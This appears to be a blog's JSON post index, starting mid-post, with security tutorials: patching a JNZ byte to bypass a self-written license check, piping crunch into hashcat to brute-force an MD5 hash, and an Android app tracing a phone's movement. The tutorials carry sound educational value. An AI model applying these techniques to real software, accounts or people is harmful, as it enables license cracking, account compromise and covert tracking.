modules. (pandas module in python is suggested)FormattingThis is sample data set of 6 applications (3 Malware &amp; 3 Benign)The 1st column contains NAME of respective application and last column “CLASS” contains information if the application if from benign or malware family of training set. [0=Benign, 1=Malware]. In between there are all the permissions (common + all found in 1st phase) with respective information bit, [0=The application do not use this permission, 1=This permission is used in the application]Importing Data Example in sklearnSuppose you want to import your new data set into sklearn and train your new model from there, here’s a way you can do that.file = pd.read_csv(\"data.csv\")coulmnNames = file.iloc[1:1, 1:].columnsFeatureNames = list(coulmnNames[1:-1])LabelName = coulmnNames[-1]X = file[FeatureNames]X = np.asarray(X)Y = file[LabelName]Y = np.asarray(Y)feature_vectors = Xlabels = Ytrain_x, test_x, train_y, test_y = train_test_split(feature_vectors,labels,test_size=0.2)The above code will remove NAME column and then store FEATURE_MATRIX (from column after NAME to second last column) and LABEL_VECTOR ( CLASS column) in X and Y respectively, which later can be split into desired training and testing sets.CONCLUSIONI hope this article will get you started with feature extraction for malware analysis using machine learning. It isn’t the end of it, but we just completed one step !" }, { "title": "Taking over by Instruction Rewriting.", "url": "/blog/posts/Taking-over-a-software-by-Instruction-Rewriting/", "categories": "Security", "tags": "RE, Assembly", "date": "2019-11-25 12:12:12 +0530", "snippet": " Baby steps to binary rewriting and reverse engineering.\"Almost every code we write and compile is converted into machine code and set of instructions.\"Pretty basic definition for what compiler does huh?Well, let me re-frame that with respect to a reverse engineer’s point of view,\"It doesn’t matter if you write your code in C, C++ or C# it will be converted into machine code, which can be viewed as a common low level language, Assembly.\"In simpler terms, all we need to understand is the assembly of code and without having its actual source code we can conclude what it will do. Now what to do from here?Imagine we got a program that will activate when provided with valid key, pretty common scenario right? You might say just buy the key, or download the crack etc. pretty boring solutions too… Now, what if I tell you, we can activate the program just by changing it’s binary, that too just 2–6 bytes! YES! And that’s what we will try to understand in this article.Actually most of such programs use comparison statements to check if your key matches with the actual key or not, e.g. “if (input == key) {//do thing here}” etc.And that very thing in assembly is done by “CMP” instruction and then followed by a “JMP” or similar instruction to shift the flow of controls according to the result of comparison.Let’s do it.Let us make an application, this application works in the same fashion, check for the key and activate if matches. The program is written in C and compiled by the GCC compiler.#include &lt;string.h&gt;#include &lt;stdio.h&gt;int main(int argc, char *argv[]) { if(argc==2) {\t\tprintf(\"Checking License: %s\\n\", argv[1]); int sum = 0; for (int i = 0; i &lt; strlen(argv[1]); i++) {\t\t\tsum+= (int)argv[1][i];\t\t\t}\t\tif(sum==1000) {\t\t\tprintf(\"Access Granted!\\n\");\t\t} else {\t\t\tprintf(\"WRONG!\\n\");\t\t}\t} else {\t\tprintf(\"Usage: &lt;key&gt;\\n\");\t}\treturn 0;}Here is one example where we use “saket” as the key.As we expected it to behave, when provided with invalid key it will say “WRONG!”When we observe the compiled binary in our favorite debugger we can see one instruction “CMP [RBP+VAR_18], 394H” that checks the string passed and then compares it with (394)h =(916)d that seems to be string length or something, the interesting part is that it is followed by “JNZ SHORT LOC_400657” instruction, which makes EIP or instruction pointer to point at 400657th location. In simple words, shifts the control flow to 400657th location in memory , and execute instruction from there. Further we can see that LOC_400657 contains instructions of WRONG KEY part of software.So what if we can just skip that jump statement and whatever the result of the CMP we will just continue to Access Granted part. To do that we will just change jump address in HEX DUMP from “0C” to “00” which will cause EIP to just continue to the next instruction.For that we will go to the hex equivalent of the instruction in dump and change the value in target address.here we can observe JNZ instruction starts at 400649 (relative address), we can go to same in hex dump to get equivalent hex values.now we know that JNZ SHORT LOC_400649 ~ 75 0C; Now keeping JNZ intact, i.e. not changing 75, we can change 0C to 00 to try to null it’s effect. or we can just replace the next effective address,something like this :But for this article, we will just replace 0C with 00…THAT IS, THISTOAnd now you can see our instruction continues to ACCESS GRANTED part, and no instruction points to WRONG KEY. That means we should be able to activate the software with any key we want!.Now let’s check that with the same key we provided, and just another key to check our modification.And that works pretty good!ConclusionBinary rewriting in real-world scenarios is much more complex than this example, but anyways this is just introduction with the aim to get the us familiar with the concept.I hope you enjoyed this, have a super productive day ahead !" }, { "title": "Brute-force Attack via Pass. Gen.", "url": "/blog/posts/Pipe-Brute-force-Attack-via-Password-Generator/", "categories": "Security", "tags": "crunch, hashcat", "date": "2019-07-27 12:12:12 +0530", "snippet": "(Efficient and resource saving trick that was there for decades)During password cracking you might decide to brute force a target hash,any service or online website, for that you may need/create heavy dictionaries which can take terabytes of data. But we can skip that step and feed the password directly from generator to brute-force automation software.How much an eight digit long numeric password take on disk?Let’s have a look on most basic and may-be-doesn’t-even-happen-today kind of scenario, creating a 8 digit numerical password with crunch.858 MB for 8 digit numeric? not too big right, with our 1–2TBs of hard-drives it will do no harm to us.let’s come to real-life condition now, step-by-step …8 letter lowercase alphabets ? …1 TB ! just for our new word-list, and to be honest I am writing this from my PC with total storage of 1TB … if i remove all the files and OSes then i may store it, but again i need OS to perform attacks ¯_(ツ)_/¯.and this is last one fulfilling all the basic NEEDS OF MODERN WEBSITES. at least one UPPERCASE use of NUMBERS lowecase SPECIAL SYMBOLS Alien species’s language and what ever your PC allows you to throw at login filed!CHAR-SET = 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!”#$%&amp;’()*+,-./:;&lt;=&gt;?@[]^_`{ }~ now unless you own a data storage farm to store 54303 TB of data, that would be ~ 27150 common 2TB storage drives, so let’s get over this problem by ‘piping’ the output directly to software rather than storing it in the device itself.How to overcome this limitation?Suppose we want to crack the hash of password ‘17652986’ now md5 of this hash ce5cff0195a6b059a3241c1b6202ab49 now we can either create a file of 8 digits numbers or can just pass the list from crunch directly to hashcatcrunch 8 8 123456789| hashcat -m 0 ce5cff0195a6b059a32411b6202ab49notice the ‘|’ in the command? this is called ‘pipe’ it will change the standard output of the crunch command to to hashcat and the hashcat when supplied no word-lists, listens on standard input.Flow of data from buffer to brute-force program directly (left figure) — (1)Flow of data to hard-disk and then to the program (right figure) — (2)Here we can already see (1) is much faster and efficient in practice as it does not interact with the hard-disk at all.and you can see it took just 31 seconds to crack 8 digit numeric password highlighted, but that’s predictable and speed here was not our concern.ConclusionSo, our motive here is complete as we have saved resources and hacking with all the skills is also all about speed, accuracy and efficiency." }, { "title": "Movement Tracing in Android", "url": "/blog/posts/Live-Movement-Tracing-in-Android-using-Polygraph-Lines/", "categories": "Misc.", "tags": "android, project", "date": "2019-07-15 12:12:12 +0530", "snippet": "Android already have accurate Geo location capabilities by using multiple sources like Cellular Networks, G.P.S. and nearby Wi-Fi connections. And that’s handful of sources to extract information from, but their working and synchronisation among each other is real beauty.I also want to share my views on “Location Detection” and “Location Tracing”, there is a difference between “Locating” something and Tracking/Tracing something, android’s pretty accurate in pointing you on globe, and of course we can use classes with some location permissions to request for location information but that would only give us a set of LAT,LON format integers to work with ; from that information we can only point someone/something (cause now-a-days things do have internet) so how to trace that movement?In this write up i will use my selected location which is less concentrated like city to make things more clear and i had more space to roam here and there in any direction to test the application.Some thoughts on Security and Location TracingAs a citizen of digital age and a cybersecurity student you cannot stop yourself thinking about implementation of things on the field.As we know knowing someone’s current location can give attacker a high attacking ground but knowing exactly where someone is going with which path is generally followed will help him in creating better plotted trap!The attacker can know where you are actually going and what’s your daily commute routine and plan accordingly.Prevention?Just turning off the GPS will not help much, as you will see in this post later, we can get location based on mobile network and nearby wifi networks too.Just lookout for unknown apps and sudden/ suspicious activation of GPS / Location services. as google tries to get most precise information so it may trigger “Networks+WiFi+GPS High Performance” which you usually can’t miss.Idea behind Movement Tracing.So, the idea is pretty basic and actually we all learn it in our highschool mathematics, and that’s GRAPHS and how plotting works.We already know that we can get longitudes and latitudes from google itself in our app, just like points on graph of globe, the idea is to collect those points and then make a line from one to each other … easy? yeah its kind of easy.Applying Idea via code.So first we need to get permissions from the user to use location and internet. &lt;uses-permission android:name=”android.permission.ACCESS_FINE_LOCATION” /&gt;&lt;uses-permission android:name=”android.permission.INTERNET” /&gt;after setting up permissions in Manifest.xml, we can proceed further and get our Google API key to use, yeah, to use google maps and related functions we need to grab those, but it’s easy process, here lemme attach a link to a dedicated tutorial if you need.Google API, Android SDKso, as now you have the keys time to setup our app and get going …The code is actually long enough to take up 2–3 pages here so I think it would be better to just port the code directly and from GitHub and then modify as it pleases you. Get the Repo from GitHubThings you need to change in that :ENTER YOUR API KEY IN app/src/debug/res/values/google_maps_api.xml&lt;string name=”google_maps_key” templateMergeStrategy=”preserve” translatable=”false”&gt;YOUR-KEY-HERE&lt;/string&gt;And that would just do it.Clone the Repo and open it up in Android Studio, you may need to change some more code maybe to build it perfectly, cause no code I have ever cloned till now works in first go. ¯\\(ツ)/¯Let’s understand the workingFor the first time I would suggest you to just build the application as it is so that you can follow with this write-up after that feel free to modify the app and use it as it pleases your creativity.The app is divided in to 3 parts - Text Location Update Location on Map Using Polygraph and Algorithm to trace it on mapPart 1:This just tests the location set we can request from Google Maps API and represent them in text, also we can get which MODE is used in the process (GPS,NETWORK,WIFI).Part 2:This part integrates “Google Maps Activity” layout already available in Android Studio. The idea is to collect information from provider and then pass it to Maps Activity which will then place a marker on that location.Part 3:Well this is main section of the application which actually traces your location on map.The steps executed in this part are important,1. Get location from provider2. Set Red marker on starting point / initial location3. Set Location Listener to check for location change4. When ever location change is detected will add a point over map5. Draw line joining those points6. Place Green marker over last point.7. Loop 1–6 until application is closed / location provide is not available.Check out this Code for a moment …package locationpolymorph.test.sacredcoder.livelocationtriangulation;import android.Manifest;import android.app.Activity;import android.content.pm.PackageManager;import android.graphics.Color;import android.location.Address;import android.location.Geocoder;import android.location.Location;import android.location.LocationListener;import android.location.LocationManager;import android.os.Build;import android.support.annotation.RequiresApi;import android.support.v4.app.ActivityCompat;import android.support.v4.app.FragmentActivity;import android.os.Bundle;import android.view.WindowManager;import com.google.android.gms.maps.CameraUpdateFactory;import com.google.android.gms.maps.GoogleMap;import com.google.android.gms.maps.OnMapReadyCallback;import com.google.android.gms.maps.SupportMapFragment;import com.google.android.gms.maps.model.BitmapDescriptorFactory;import com.google.android.gms.maps.model.JointType;import com.google.android.gms.maps.model.LatLng;import com.google.android.gms.maps.model.Marker;import com.google.android.gms.maps.model.MarkerOptions;import com.google.android.gms.maps.model.Polyline;import com.google.android.gms.maps.model.PolylineOptions;import java.io.IOException;import java.util.ArrayList;import java.util.List;public class PolyMap extends FragmentActivity implements OnMapReadyCallback { private GoogleMap mMap; Marker marker; Marker marker2; LocationListener locationListener; LocationManager locationManager; protected static final int REQUEST_LOCATION_PERMISSION = 1; //for line private Polyline polyline; private Activity activity; private Boolean flag=true; private List&lt;LatLng&gt; polylinePoints; @RequiresApi(api = Build.VERSION_CODES.P) @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_poly_map); getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON); // Obtain the SupportMapFragment and get notified when the map is ready to be used. SupportMapFragment mapFragment = (SupportMapFragment) getSupportFragmentManager() .findFragmentById(R.id.mapp); mapFragment.getMapAsync(this); polylinePoints = new ArrayList&lt;&gt;(); locationManager = (LocationManager) getSystemService(LOCATION_SERVICE); if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) { ActivityCompat.requestPermissions(this, new String[] {Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_LOCATION_PERMISSION); }//polyline.setColor(Color.GREEN); locationListener = new LocationListener() { @Override public void onLocationChanged(Location location) { //if(location.hasAccuracy()) { // if (location.getAccuracy() &lt; 20.0f) { double latitude = location.getLatitude(); double longitude = location.getLongitude(); //get the location name from latitude and longitude Geocoder geocoder = new Geocoder(getApplicationContext()); try { List&lt;Address&gt; addresses = geocoder.getFromLocation(latitude, longitude, 1); String result = addresses.get(0).getLocality() + \":\"; result += addresses.get(0).getCountryName(); LatLng latLng = new LatLng(latitude, longitude); if (flag) { marker2 = mMap.addMarker(new MarkerOptions().position(latLng).title(result).icon(BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_ROSE))); } if (marker != null) { marker.remove(); marker = mMap.addMarker(new MarkerOptions().position(latLng).title(result).icon(BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_GREEN))); mMap.setMaxZoomPreference(20); mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(latLng, 18.0f)); } else { marker = mMap.addMarker(new MarkerOptions().position(latLng).title(result).icon(BitmapDescriptorFactory.defaultMarker(120.0f))); mMap.setMaxZoomPreference(20); mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(latLng, 18.0f)); } polylinePoints.add(latLng); if (polyline != null) { polyline.setPoints(polylinePoints); } else { polyline = mMap.addPolyline(new PolylineOptions().addAll(polylinePoints).color(Color.MAGENTA).jointType(JointType.ROUND).width(3.0f)); } flag = false; } catch (IOException e) { e.printStackTrace(); } // } //} } @Override public void onStatusChanged(String provider, int status, Bundle extras) { } @Override public void onProviderEnabled(String provider) { } @Override public void onProviderDisabled(String provider) { } }; locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener); locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationListener); } //TO MANAGE THE MAP AS ONE WHEN THE MAP VIEW IS AVAILABLE FOR THE USER. @Override public void onMapReady(GoogleMap googleMap) { mMap = googleMap; mMap.setMapType(mMap.MAP_TYPE_SATELLITE); } @Override protected void onStop() { super.onStop(); locationManager.removeUpdates(locationListener); } //CLOSE THE SESSION WHEN THE BACK IS PRESSED. @Override public void onBackPressed() { super.onBackPressed(); this.finish(); }}We can see here what ‘Location Listener’ is actually doing,locationListener = new LocationListener() { @Override public void onLocationChanged(Location location)It is also interesting to see how we choose most precise location provider availablepublic void onProviderDisabled(String provider) { } };locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener); locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationListener); }The next thing in this code to notice is how we are managing Polygraph Lines and Markers together to create lines on mapimport com.google.android.gms.maps.model.Marker; import com.google.android.gms.maps.model.MarkerOptions; import com.google.android.gms.maps.model.Polyline; import com.google.android.gms.maps.model.PolylineOptions;next comes the code for step 2,4 and 5if (marker != null) {marker.remove();marker = mMap.addMarker(new MarkerOptions().position(latLng).title(result).icon(BitmapDescriptorFactory.defaultMarker(BitmapDescriptorFactory.HUE_GREEN)));mMap.setMaxZoomPreference(20);mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(latLng, 18.0f));} else {marker = mMap.addMarker(new MarkerOptions().position(latLng).title(result).icon(BitmapDescriptorFactory.defaultMarker(120.0f)));mMap.setMaxZoomPreference(20);mMap.moveCamera(CameraUpdateFactory.newLatLngZoom(latLng, 18.0f));}polylinePoints.add(latLng);here we check marker position and add new points to our PolyLineif (polyline != null) { polyline.setPoints(polylinePoints);} else {polyline = mMap.addPolyline(new PolylineOptions().addAll(polylinePoints).color(Color.MAGENTA).jointType(JointType.ROUND).width(3.0f));} flag = false;} catch (IOException e) {e.printStackTrace(); }above code checks PolyLine and draws it over GoogleMap activity.Compiling all above steps and logic, we got a cute and precise trace line over Satellite Map.What next?Well… Now you know how to trace location over maps, like a cool modern cartographer 😬. Your imagination is the limit.some ideas : The points of polygraphs, if stored in arrays or any of your fav. data structure can be passed to your database and then share that with your other apps to live track group of friends together. Can run this service in background to store data points and then draw them whenever needed." } ]
